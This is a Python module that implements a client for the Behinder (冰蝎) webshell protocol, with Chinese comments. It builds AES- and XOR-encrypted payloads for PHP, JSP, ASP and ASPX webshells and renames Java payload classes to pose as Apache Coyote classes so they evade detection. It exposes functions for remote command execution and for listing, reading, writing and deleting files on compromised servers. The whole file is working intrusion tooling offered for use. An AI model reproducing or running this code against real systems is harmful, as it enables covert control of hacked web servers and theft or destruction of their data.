"""
冰蝎 (Behinder) 协议 Python 移植

参考 kimi/wsm，目前实现 PHP AES/XOR 与 JSP/JSPX AES，ASP/ASPX 逐步补齐。
"""

import base64
import hashlib
import json
import logging
import random
import re
import typing as t
from pathlib import Path

import httpx
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

logger = logging.getLogger("core.wsm.behinder")

PAYLOAD_DIR = Path(__file__).parent / "wsm_payloads" / "behinder"


def secret_key(pwd: str) -> bytes:
    return hashlib.md5(pwd.encode()).hexdigest()[:16].encode()


def aes_ecb_encrypt(data: bytes, key: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(pad(data, 16))


def aes_ecb_decrypt(data: bytes, key: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_ECB)
    return unpad(cipher.decrypt(data), 16)


def aes_cbc_zero_iv_encrypt(data: bytes, key: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv=b"\x00" * 16)
    return cipher.encrypt(pad(data, 16))


def aes_cbc_zero_iv_decrypt(data: bytes, key: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv=b"\x00" * 16)
    return unpad(cipher.decrypt(data), 16)


def aes_cbc_key_iv_encrypt(data: bytes, key: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv=key)
    return cipher.encrypt(pad(data, 16))


def aes_cbc_key_iv_decrypt(data: bytes, key: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv=key)
    return unpad(cipher.decrypt(data), 16)


def xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes([c ^ key[(i + 1) & 15] for i, c in enumerate(data)])


def _random_prefix() -> bytes:
    return f"{random.randbytes(random.randint(1, 32)).hex()}|".encode()


def replace_class_str_var(class_bytes: bytes, old_var: str, new_var: str) -> bytes:
    """替换 class 常量池中的字符串变量（参考 dynamic.ReplaceClassStrVar）"""
    hex_code = class_bytes.hex()
    old_hex = f"{len(old_var):04x}" + old_var.encode().hex()
    pos = hex_code.rfind(old_hex)
    if pos == -1:
        raise ValueError(f"无法在 class 中找到变量 {old_var}")
    new_hex = f"{len(new_var):04x}" + new_var.encode().hex()
    new_hex_code = hex_code[:pos] + hex_code[pos:].replace(old_hex, new_hex, 1)
    return bytes.fromhex(new_hex_code)


def replace_class_name(class_bytes: bytes, old_name: str, new_name: str) -> bytes:
    old_bytes = old_name.encode()
    new_bytes = new_name.encode()
    patterns = [
        (bytes([len(old_name) + 2, 76]) + old_bytes, bytes([len(new_name) + 2, 76]) + new_bytes),
        (bytes([len(old_name)]) + old_bytes, bytes([len(new_name)]) + new_bytes),
    ]
    for p, r in patterns:
        class_bytes = class_bytes.replace(p, r)
    return class_bytes


def replace_source_file(class_bytes: bytes, old: str, new: str) -> bytes:
    if not old.endswith(".java"):
        old += ".java"
    if not new.endswith(".java"):
        new += ".java"
    pattern = bytes([0, len(old)]) + old.encode()
    repl = bytes([0, len(new)]) + new.encode()
    return class_bytes.replace(pattern, repl, 1)


def replace_func_name(class_bytes: bytes, old: str, new: str) -> bytes:
    pattern = bytes([0, len(old)]) + old.encode()
    repl = bytes([0, len(new)]) + new.encode()
    return class_bytes.replace(pattern, repl, 1)


def _random_class_name() -> str:
    names = [
        "org.apache.coyote.AbstractTypeResolver",
        "org.apache.coyote.AnnotationIntrospector",
        "org.apache.coyote.BeanDescription",
        "org.apache.coyote.DeserializationConfig",
        "org.apache.coyote.ObjectMapper",
        "org.apache.coyote.JsonSerializer",
    ]
    return random.choice(names).replace(".", "/")


def _get_php_param_names(payload: bytes) -> t.List[str]:
    m = re.search(rb"main\s*\(([^)]*)\)", payload)
    if not m:
        return []
    return [n.decode() for n in re.findall(rb"\$([a-zA-Z_][a-zA-Z0-9_]*)", m.group(1))]


class BehinderClient:
    def __init__(
        self,
        url: str,
        password: str,
        script: str,
        mode: int,
        proxy: t.Optional[str] = None,
        verify: bool = False,
    ):
        self.url = url
        self.key = secret_key(password)
        self.script = script.lower()
        self.mode = mode
        self.proxy = proxy
        self.verify = verify
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        if self.script in ("jsp", "jspx", "php"):
            headers["Content-type"] = "application/x-www-form-urlencoded"
        elif self.script == "aspx":
            headers["Content-type"] = "application/octet-stream"
        self.client = httpx.AsyncClient(
            proxy=proxy,
            verify=verify,
            headers=headers,
            timeout=httpx.Timeout(30),
        )

    def _encrypt(self, data: bytes) -> bytes:
        if self.script in ("jsp", "jspx"):
            return aes_ecb_encrypt(data, self.key)
        if self.script == "php":
            return aes_cbc_zero_iv_encrypt(data, self.key) if self.mode == 0 else xor_bytes(data, self.key)
        if self.script == "asp":
            return xor_bytes(data, self.key)
        if self.script == "aspx":
            return aes_cbc_key_iv_encrypt(data, self.key)
        raise NotImplementedError(f"脚本 {self.script} 加密未实现")

    def _decrypt(self, data: bytes) -> bytes:
        if self.script in ("jsp", "jspx"):
            return aes_ecb_decrypt(data, self.key)
        if self.script == "php":
            return aes_cbc_zero_iv_decrypt(data, self.key) if self.mode == 0 else xor_bytes(data, self.key)
        if self.script == "asp":
            return xor_bytes(data, self.key)
        if self.script == "aspx":
            return aes_cbc_key_iv_decrypt(data, self.key)
        raise NotImplementedError(f"脚本 {self.script} 解密未实现")

    def _build_php_payload(self, class_name: str, params: t.Dict[str, str]) -> bytes:
        payload_path = PAYLOAD_DIR / "php" / f"en{class_name}.php"
        payload_bytes = payload_path.read_bytes()
        code = payload_bytes.decode("utf-8", errors="replace")
        # enCmdGo.php 里使用了未定义的 fe() 作为 function_exists 的简写，补充定义
        if "fe(" in code and "function fe(" not in code:
            code = "function fe($x){return function_exists($x);}\n" + code
        param_names = _get_php_param_names(payload_bytes)
        param_list = []
        for name in param_names:
            if name in params:
                value_b64 = base64.b64encode(params[name].encode()).decode()
                code += f'$%s="%s";$%s=base64_decode($%s);' % (name, value_b64, name, name)
            else:
                code += f'${name}="";'
            param_list.append(f"${name}")
        code += "\r\nmain(" + ",".join(param_list) + ");"
        body = ("assert|eval(base64_decode('" + base64.b64encode(code.encode()).decode() + "'));").encode()
        enc = self._encrypt(body)
        return base64.b64encode(enc)

    def _build_java_payload(self, class_name: str, params: t.Dict[str, str]) -> bytes:
        payload_path = PAYLOAD_DIR / "java" / f"en{class_name}.class"
        class_bytes = bytearray(payload_path.read_bytes())
        old_name = f"net/behinder/payload/java/{class_name}"
        new_name = _random_class_name()
        class_bytes = bytearray(replace_class_name(bytes(class_bytes), old_name, new_name))
        class_bytes = bytearray(replace_source_file(bytes(class_bytes), class_name + ".java", new_name.split("/")[-1] + ".java"))
        class_bytes = bytearray(replace_func_name(bytes(class_bytes), "execCommand", "execCommand2"))
        for k, v in params.items():
            class_bytes = bytearray(replace_class_str_var(bytes(class_bytes), k, v))
        class_bytes[7] = 49
        enc = aes_ecb_encrypt(bytes(class_bytes), self.key)
        return base64.b64encode(enc)

    def _build_asp_payload(self, class_name: str, params: t.Dict[str, str]) -> bytes:
        payload_path = PAYLOAD_DIR / "asp" / f"en{class_name}.asp"
        code = payload_path.read_text(encoding="utf-8", errors="replace")
        # ASP payload 的 main 按位置取参数：
        #   CmdGo 只接收 cmd；EchoGo 接收 content；FileOperationGo 接收 (mode, path, content, charset)
        if class_name == "CmdGo":
            ordered_keys = ["cmd"]
        elif class_name == "EchoGo":
            ordered_keys = ["content"]
        elif class_name == "FileOperationGo":
            ordered_keys = ["mode", "path", "content", "charset"]
        else:
            ordered_keys = []
        values = []
        for k in ordered_keys:
            values.append(params.get(k, ""))
        # 去掉末尾未提供的空参数，避免 Array(a,b,) 语法错误
        while values and values[-1] == "":
            values.pop()
        args = []
        for value in values:
            encoded = "&".join(f"chrw({ord(ch)})" for ch in value)
            args.append(encoded)
        arg_list = ",".join(args)
        code += f"\r\nmain Array({arg_list})"
        body = code.encode("utf-8", errors="replace")
        return xor_bytes(body, self.key)

    def _build_csharp_payload(self, class_name: str, params: t.Dict[str, str]) -> bytes:
        payload_path = PAYLOAD_DIR / "csharp" / f"en{class_name}.dll"
        assembly = payload_path.read_bytes()
        if params:
            token_params = ",".join(
                f"{k}:{base64.b64encode(v.encode()).decode()}" for k, v in params.items()
            )
            assembly += ("~~~~~~" + token_params).encode()
        return aes_cbc_key_iv_encrypt(assembly, self.key)

    async def _request(self, class_name: str, params: t.Dict[str, str]) -> t.Dict[str, str]:
        if self.script in ("php",):
            data = self._build_php_payload(class_name, params)
        elif self.script in ("jsp", "jspx"):
            data = self._build_java_payload(class_name, params)
        elif self.script == "asp":
            data = self._build_asp_payload(class_name, params)
        elif self.script == "aspx":
            data = self._build_csharp_payload(class_name, params)
        else:
            raise NotImplementedError(f"脚本 {self.script} 请求未实现")

        resp = await self.client.post(self.url, content=data, headers={"Content-Length": str(len(data))})
        resp.raise_for_status()
        raw = resp.content
        return self._parse_response(raw)

    def _decrypt_response(self, raw: bytes) -> bytes:
        """尝试用多种方式解密响应，兼容 PHP 是否开启 openssl 扩展。"""
        if self.script in ("php",):
            # PHP payload 在有 openssl 时返回 base64(AES)，否则返回原始 XOR
            candidates: t.List[bytes] = []
            try:
                candidates.append(base64.b64decode(raw))
            except Exception:
                pass
            candidates.append(raw)
            for data in candidates:
                for decrypted in (aes_cbc_zero_iv_decrypt(data, self.key), xor_bytes(data, self.key)):
                    try:
                        if b"status" in decrypted or b"msg" in decrypted:
                            return decrypted
                    except Exception:
                        pass
            raise ValueError("无法解密冰蝎响应")
        if self.script == "aspx":
            return aes_cbc_key_iv_decrypt(raw, self.key)
        return self._decrypt(raw)

    def _parse_response(self, raw: bytes) -> t.Dict[str, str]:
        decrypted = self._decrypt_response(raw)
        text = decrypted.decode("utf-8", errors="replace")
        m = re.search(r"\{.*?\}", text, re.S)
        if not m:
            return {"raw": text}
        obj = json.loads(m.group())
        return {k: base64.b64decode(v).decode("utf-8", errors="replace") for k, v in obj.items()}

    async def ping(self) -> bool:
        content = "ping_test"
        try:
            result = await self._request("EchoGo", {"content": content})
            return result.get("msg") == content
        except Exception as exc:
            logger.debug("behinder ping failed: %s", exc)
            return False

    async def basicinfo(self) -> t.Dict[str, str]:
        return await self._request("BasicInfoGo", {"whatever": "x"})

    async def exec_command(self, cmd: str) -> str:
        result = await self._request("CmdGo", {"cmd": cmd, "path": "/"})
        return result.get("msg", "")

    async def list_dir(self, path: str) -> t.Dict[str, str]:
        return await self._request("FileOperationGo", {"path": path, "mode": "list"})

    async def read_file(self, path: str) -> bytes:
        result = await self._request("FileOperationGo", {"path": path, "mode": "show", "charset": "UTF-8"})
        return result.get("msg", "").encode()

    async def write_file(self, path: str, content: t.Union[str, bytes]) -> bool:
        if self.script == "asp":
            # ASP payload 直接写入二进制流，参数通过 chrw 编码原始字节
            if isinstance(content, bytes):
                content = content.decode("latin1", errors="replace")
        else:
            if isinstance(content, bytes):
                content = base64.b64encode(content).decode()
            elif isinstance(content, str):
                content = base64.b64encode(content.encode()).decode()
        result = await self._request(
            "FileOperationGo",
            {"path": path, "mode": "create", "content": content},
        )
        return "success" in result.get("status", "").lower()

    async def delete_file(self, path: str) -> bool:
        result = await self._request("FileOperationGo", {"path": path, "mode": "delete"})
        return "success" in result.get("status", "").lower()
